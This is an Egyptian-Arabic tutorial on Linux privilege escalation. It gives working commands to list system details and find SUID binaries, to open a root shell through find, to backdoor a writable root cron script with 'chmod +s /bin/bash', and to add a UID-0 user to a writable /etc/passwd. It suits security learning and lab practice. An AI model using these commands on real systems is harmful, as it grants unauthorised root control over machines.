# أساسيات تصعيد الصلاحيات في لينكس (Linux Privilege Escalation)

الملف ده بيشرح إزاي أسطى الهكر البيئي بيقدر يرقي نفسه من مستخدم عادي مالوش صلاحيات كبار لمستخدم الـ `root` اللي مسيطر على السيرفر كله.

---

## 1. فحص النظام والبيئة (System & Environment Enumeration)

أول حاجة بتعملها لما تاخد شيل (Shell) على جهاز، إنك تجمع معلومات عن الجهاز والنظام اللي شغال عليه.

```bash
# معرفة إصدار النواة والمعمارية (Kernel version & architecture)
uname -a

# قراءة تفاصيل وتوزيعة نظام التشغيل (OS Release info)
cat /etc/os-release

# معرفة اسم المستخدم الحالي والجروبات اللي هو فيها
id

# أهم خطوة: فحص الأوامر اللي مسموح لك تشغلها كـ root من غير باسورد
sudo -l

# فحص البرامج والخدمات الشغالة حالياً على النظام كـ root
ps aux | grep root
```

---

## 2. استغلال ملفات الـ SUID والـ SGID

ملفات الـ SUID دي عبارة عن برامج بتشتغل بصلحية صاحب الملف الأصلي (اللي هو غالباً الـ `root`) مش بصلحية الشخص اللي بيشغلها.

### البحث عن ملفات الـ SUID في الجهاز
```bash
find / -perm -4000 -type f 2>/dev/null
```

### الاستغلال عن طريق موقع GTFOBins
لو لقيت برنامج زي `find` أو `vim` أو `bash` مرفوع عليه صلاحية الـ SUID، بتدخل على موقع GTFOBins وتجيب كود التخطي علشان تفتح شيل `root`:

```bash
# مثال: لو برنامج find عليه SUID بتقدر تفتح منه root shell بالسطر ده
find . -exec /bin/sh -p \; -quit
```

---

## 3. المهام المجدولة الخاطئة (Insecure Cron Jobs)

الـ Cron Jobs دي عبارة عن سكربتات أو أوامر النظام بيشغلها أوتوماتيك كل فترة زمانية معينة بصلحية الـ `root`.

### فحص ملفات والمهام المجدولة
```bash
cat /etc/crontab
ls -la /etc/cron.*
```

### طريقة الاستغلال
لو لقيت كرون جوب بتشغل سكربت معين كـ root، والسكربت ده أنت ليك صلاحية تعديل فيه (Writable)، بتزود فيه أمر يرفع صلاحيتك أو يبعت لك Reverse Shell:

```bash
# ضيف السطرين دول في آخر السكربت المفتوح للتعديل
echo "#!/bin/bash" >> /opt/backup.sh
echo "chmod +s /bin/bash" >> /opt/backup.sh
```

## 4. صلاحيات الملفات الحساسة الخاطئة (/etc/passwd)

بنتأكد هل ملفات الحسابات والباسوردات فيها غلطة في الصلاحيات ومفتوحة للكتابة لأي حد ولا لأ.

```bash
ls -la /etc/passwd
ls -la /etc/shadow
```

لو ملف `/etc/passwd` مفتوح للكتابة، بتعمل هاش لباسورد جديد وتضيف يوزر جديد بصلاحيات root (UID 0):

```bash
# اعمل هاش للباسورد
openssl passwd -1 -salt hacker Password123

# ضيف اليوزر الجديد جوه ملف /etc/passwd
# hacker:$1$hacker$T1p9J3g...:0:0:root:/root:/bin/bash
```
